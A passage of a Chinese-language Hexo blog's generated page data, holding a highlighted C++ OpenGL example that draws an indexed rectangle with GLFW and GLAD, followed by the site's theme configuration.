class=\"string\">&quot;&#125;\\n\\0&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// glfw: 初始化和配置</span></span><br><span class=\"line\">    <span class=\"comment\">// ------------------------------</span></span><br><span class=\"line\">    glfwInit();</span><br><span class=\"line\">    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, <span class=\"number\">4</span>);</span><br><span class=\"line\">    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, <span class=\"number\">6</span>);</span><br><span class=\"line\">    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// glfw: Mac OS X 系统需配置以下代码</span></span><br><span class=\"line\">    <span class=\"comment\">// ------------------------------</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> __APPLE__</span></span><br><span class=\"line\">    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// glfw 窗口创建</span></span><br><span class=\"line\">    <span class=\"comment\">// --------------------</span></span><br><span class=\"line\">    GLFWwindow* window = glfwCreateWindow(SCR_WIDTH, SCR_HEIGHT, <span class=\"string\">&quot;LearnOpenGL&quot;</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (window == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;Failed to create GLFW window&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        glfwTerminate();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    glfwMakeContextCurrent(window);</span><br><span class=\"line\">    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// glad: 初始化Glad，加载所有OpenGL函数指针</span></span><br><span class=\"line\">    <span class=\"comment\">// ---------------------------------------</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;Failed to initialize GLAD&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 构建着色器</span></span><br><span class=\"line\">    <span class=\"comment\">// ------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\">// 顶点着色器</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> vertexShader = glCreateShader(GL_VERTEX_SHADER);</span><br><span class=\"line\">    glShaderSource(vertexShader, <span class=\"number\">1</span>, &amp;vertexShaderSource, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    glCompileShader(vertexShader);</span><br><span class=\"line\">    <span class=\"comment\">// 检查着色器编译错误</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> success;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> infoLog[<span class=\"number\">512</span>];</span><br><span class=\"line\">    glGetShaderiv(vertexShader, GL_COMPILE_STATUS, &amp;success);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!success)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        glGetShaderInfoLog(vertexShader, <span class=\"number\">512</span>, <span class=\"literal\">NULL</span>, infoLog);</span><br><span class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;ERROR::SHADER::VERTEX::COMPILATION_FAILED\\n&quot;</span> &lt;&lt; infoLog &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 片段着色器</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);</span><br><span class=\"line\">    glShaderSource(fragmentShader, <span class=\"number\">1</span>, &amp;fragmentShaderSource, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    glCompileShader(fragmentShader);</span><br><span class=\"line\">    <span class=\"comment\">// 检查片段着色器编译错误</span></span><br><span class=\"line\">    glGetShaderiv(fragmentShader, GL_COMPILE_STATUS, &amp;success);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!success)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        glGetShaderInfoLog(fragmentShader, <span class=\"number\">512</span>, <span class=\"literal\">NULL</span>, infoLog);</span><br><span class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;ERROR::SHADER::FRAGMENT::COMPILATION_FAILED\\n&quot;</span> &lt;&lt; infoLog &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 连接着色器</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> shaderProgram = glCreateProgram();</span><br><span class=\"line\">    glAttachShader(shaderProgram, vertexShader);</span><br><span class=\"line\">    glAttachShader(shaderProgram, fragmentShader);</span><br><span class=\"line\">    glLinkProgram(shaderProgram);</span><br><span class=\"line\">    <span class=\"comment\">// 检查连接错误</span></span><br><span class=\"line\">    glGetProgramiv(shaderProgram, GL_LINK_STATUS, &amp;success);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!success) &#123;</span><br><span class=\"line\">        glGetProgramInfoLog(shaderProgram, <span class=\"number\">512</span>, <span class=\"literal\">NULL</span>, infoLog);</span><br><span class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;ERROR::SHADER::PROGRAM::LINKING_FAILED\\n&quot;</span> &lt;&lt; infoLog &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    glDeleteShader(vertexShader);</span><br><span class=\"line\">    glDeleteShader(fragmentShader);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 设置顶点数据（和缓冲区）并配置顶点属性。</span></span><br><span class=\"line\">    <span class=\"comment\">// ------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"keyword\">float</span> vertices[] = &#123;</span><br><span class=\"line\">        <span class=\"number\">0.5f</span>, <span class=\"number\">0.5f</span>, <span class=\"number\">0.0f</span>,   <span class=\"comment\">// 右上角</span></span><br><span class=\"line\">        <span class=\"number\">0.5f</span>, <span class=\"number\">-0.5f</span>, <span class=\"number\">0.0f</span>,  <span class=\"comment\">// 右下角</span></span><br><span class=\"line\">        <span class=\"number\">-0.5f</span>, <span class=\"number\">-0.5f</span>, <span class=\"number\">0.0f</span>, <span class=\"comment\">// 左下角</span></span><br><span class=\"line\">        <span class=\"number\">-0.5f</span>, <span class=\"number\">0.5f</span>, <span class=\"number\">0.0f</span>   <span class=\"comment\">// 左上角</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> indices[] = &#123; <span class=\"comment\">// 注意索引从0开始! </span></span><br><span class=\"line\">        <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"comment\">// 第一个三角形</span></span><br><span class=\"line\">        <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>  <span class=\"comment\">// 第二个三角形</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> VAO, VBO, EBO;</span><br><span class=\"line\">    glGenVertexArrays(<span class=\"number\">1</span>, &amp;VAO);</span><br><span class=\"line\">    glGenBuffers(<span class=\"number\">1</span>, &amp;VBO);</span><br><span class=\"line\">    glGenBuffers(<span class=\"number\">1</span>, &amp;EBO);</span><br><span class=\"line\">    <span class=\"comment\">// 首先绑定顶点数组对象（VAO），然后绑定并设置顶点缓冲区，然后配置顶点属性。</span></span><br><span class=\"line\">    glBindVertexArray(VAO);</span><br><span class=\"line\"></span><br><span class=\"line\">    glBindBuffer(GL_ARRAY_BUFFER, VBO);</span><br><span class=\"line\">    glBufferData(GL_ARRAY_BUFFER, <span class=\"keyword\">sizeof</span>(vertices), vertices, GL_STATIC_DRAW);</span><br><span class=\"line\"></span><br><span class=\"line\">    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);</span><br><span class=\"line\">    glBufferData(GL_ELEMENT_ARRAY_BUFFER, <span class=\"keyword\">sizeof</span>(vertices), indices, GL_STATIC_DRAW);</span><br><span class=\"line\"></span><br><span class=\"line\">    glVertexAttribPointer(<span class=\"number\">0</span>, <span class=\"number\">3</span>, GL_FLOAT, GL_FALSE, <span class=\"number\">3</span> * <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">float</span>), (<span class=\"keyword\">void</span>*)<span class=\"number\">0</span>);</span><br><span class=\"line\">    glEnableVertexAttribArray(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 请注意，对glVertexAttribPointer的调用将VBO注册为顶点属性的绑定顶点缓冲区对象是允许的。</span></span><br><span class=\"line\">    <span class=\"comment\">// 因此之后我们可以安全地解除绑定。</span></span><br><span class=\"line\">    glBindBuffer(GL_ARRAY_BUFFER, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 之后可以取消绑定VAO，这样其他VAO调用就不会意外修改此VAO，但这很少发生。</span></span><br><span class=\"line\">    <span class=\"comment\">// 无论如何，修改其他VAO都需要调用glBindVertexArray，因此通常在不直接需要时，我们不会取消绑定VAO（或VBO）。</span></span><br><span class=\"line\">    glBindVertexArray(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 取消注释此调用以绘制线框多边形。</span></span><br><span class=\"line\">    <span class=\"comment\">//glPolygonMode(GL_FRONT_AND_BACK, GL_LINE);</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 渲染循环中</span></span><br><span class=\"line\">    <span class=\"comment\">// -----------</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (!glfwWindowShouldClose(window))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 输入</span></span><br><span class=\"line\">        <span class=\"comment\">// -----</span></span><br><span class=\"line\">        processInput(window);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 渲染</span></span><br><span class=\"line\">        <span class=\"comment\">// ------</span></span><br><span class=\"line\">        glClearColor(<span class=\"number\">0.2f</span>, <span class=\"number\">0.3f</span>, <span class=\"number\">0.3f</span>, <span class=\"number\">1.0f</span>);</span><br><span class=\"line\">        glClear(GL_COLOR_BUFFER_BIT);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 画图</span></span><br><span class=\"line\">        glUseProgram(shaderProgram);</span><br><span class=\"line\">        <span class=\"comment\">// 因为只有一个VAO，因此不必每次都绑定它，但是我们这样做是为了使事情更有条理。</span></span><br><span class=\"line\">        glBindVertexArray(VAO);</span><br><span class=\"line\">        glDrawElements(GL_TRIANGLES, <span class=\"number\">6</span>, GL_UNSIGNED_INT,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// glBindVertexArray(0); // 无需每次都解除绑定。</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// glfw: 交换缓冲区，轮询IO事件（按下/释放，鼠标移动）。</span></span><br><span class=\"line\">        <span class=\"comment\">// -------------------------------------------------------------------------------</span></span><br><span class=\"line\">        glfwSwapBuffers(window);</span><br><span class=\"line\">        glfwPollEvents();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 可选: 一旦超出其目标，则取消分配所有资源。</span></span><br><span class=\"line\">    <span class=\"comment\">// ------------------------------------------------------------------------</span></span><br><span class=\"line\">    glDeleteVertexArrays(<span class=\"number\">1</span>, &amp;VAO);</span><br><span class=\"line\">    glDeleteBuffers(<span class=\"number\">1</span>, &amp;VBO);</span><br><span class=\"line\">    glDeleteBuffers(<span class=\"number\">1</span>, &amp;EBO);</span><br><span class=\"line\">    glDeleteProgram(shaderProgram);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// glfw: 终止并清除所有先前分配的GLFW资源。</span></span><br><span class=\"line\">    <span class=\"comment\">// ------------------------------------------------------------------</span></span><br><span class=\"line\">    glfwTerminate();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 处理所有输: 查询GLFW是否在此框架中 按下/释放 了相关按键并作出相应反应。</span></span><br><span class=\"line\"><span class=\"comment\">// ---------------------------------------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">processInput</span><span class=\"params\">(GLFWwindow* window)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 当按下Esc时，窗口关闭。</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (glfwGetKey(window, GLFW_KEY_ESCAPE) == GLFW_PRESS)</span><br><span class=\"line\">        glfwSetWindowShouldClose(window, <span class=\"literal\">true</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// glfw: 当改变窗口大小时，该回调函数被执行。</span></span><br><span class=\"line\"><span class=\"comment\">// ---------------------------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">framebuffer_size_callback</span><span class=\"params\">(GLFWwindow* window, <span class=\"keyword\">int</span> width, <span class=\"keyword\">int</span> height)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 确保视口与新窗口维度相匹配，注意宽高将明显大于视网膜显示屏的宽高。</span></span><br><span class=\"line\">    glViewport(<span class=\"number\">0</span>, <span class=\"number\">0</span>, width, height);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":5887,"excerpt":"","more":"<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;glad/glad.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;GLFW/glfw3.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">framebuffer_size_callback</span><span class=\"params\">(GLFWwindow* window, <span class=\"keyword\">int</span> width, <span class=\"keyword\">int</span> height)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">processInput</span><span class=\"params\">(GLFWwindow* window)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> 